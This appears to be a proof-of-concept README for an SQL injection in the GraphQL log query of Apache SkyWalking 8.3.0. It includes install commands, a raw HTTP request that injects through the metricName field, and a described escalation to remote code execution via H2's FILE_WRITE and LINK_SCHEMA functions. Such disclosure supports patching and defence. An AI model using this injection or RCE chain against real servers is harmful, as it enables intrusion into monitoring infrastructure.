# Apache-Skywalking-8.3.0_SQL-Injection_Vulnerability
Application performance monitor tool for distributed systems, especially designed for microservices, cloud native and container-based (Docker, Kubernetes, Mesos) architectures.

In GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.

# Vulnerability environment
Let's install Apache Skywalking 8.3.0 using the following commands.<br>
```bash
sudo apt update && wget https://archive.apache.org/dist/skywalking/8.3.0/apache-skywalking-apm-8.3.0.tar.gz
```
```bash
tar -xzf apache-skywalking-apm-8.3.0.tar.gz
```
```bash
cd apache-skywalking-apm-bin/bin
```
```bash
./startup.sh
```
After the environment is started, visit http://your-ip:8080 to view the Skywalking page.
# POC
The HTTP request of this GraphQL query is:
```bash
POST /graphql HTTP/1.1
Host: 192.168.1.12:8080
Content-Length: 405
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.12:8080
Referer: http://192.168.1.12:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```
I using BurpSuite to send the following GraphQL query below
![Alt Text](https://github.com/IntheDarkn3ss/Apache-Skywalking-8.3.0_SQL-Injection_Vulnerability/blob/main/graphql_exploit.jpg)<br>
It can be seen that the SQL statement has raised error, and the value of the metricName parameter has been injected ​​after from.
![Alt Text](https://github.com/InTheDarkness2102/Apache-Skywalking-8.3.0_SQL-Injection_Vulnerability/blob/main/error.jpg)<br>
This can lead to SQL_Injection attack by injecting SQL as follows:
![Alt Text](https://github.com/InTheDarkness2102/Apache-Skywalking-8.3.0_SQL-Injection_Vulnerability/blob/main/sql_injection1.png)<br>
or <br>
![Alt Text](https://github.com/InTheDarkness2102/Apache-Skywalking-8.3.0_SQL-Injection_Vulnerability/blob/main/sql_injection2.png)<br>
# Skywalking remote code execution vulnerability warning
The database used by Skywalking in its default configuration is h2 and is started with sa permissions.
![Alt Text](https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpSqtUj3IfP4ibFHo1OzcmAzyCweSXxibFOYAf9Gm6FYHZJcjrIMuibbq4e5zYzDml43ekiaqOnhyN4ag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
By querying the official docs https://www.h2database.com/html/functions.html ,i know that the h2 database has a FILE_WRITE file writing function (requires admin rights to execute) and can control file content and file names. Attacker could take advantage of this to write arbitrary files to the internal system
![Alt Text](https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpSqtUj3IfP4ibFHo1OzcmAzU2hC0GBTa1XRJyeFo2ETliaVjKGlYjMgzgsBPTNKHibZ0MoF6rgzgZOQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
LINK_SCHEMA function can specify and initiate a jdbc or jndi request. However, since there are no tomcat and springboot dependencies in the target environment, general jndi utilization cannot be performed in higher versions of jdk, and the reference chain needs to be found in local dependencies. 
![Alt Text](https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpSqtUj3IfP4ibFHo1OzcmAz1noV1kOv4JJhHPdR24KYdhGGhCGPzAiaUAy9CphQk5bvvYNeMgia0icgQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
Further analysis of the underlying source code of LINK_SCHEMA revealed that there is a class loading process in the code, and this class is the second parameter of the sql function, which is controllable by the user. (This parameter is used to specify the jdbc driver class or jndi context class used this time) 
![Alt Text](https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpSqtUj3IfP4ibFHo1OzcmAzQVulWL5LGniakNAxsgJUEuqTjp35yhk4OHbrdcfcMaKopHhjFoayK3w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
So attacker can first use the arbitrary file writing function to write a malicious class in the classpath, and then use the LINK_SCHEMA function to load the malicious class to achieve remote code execution.

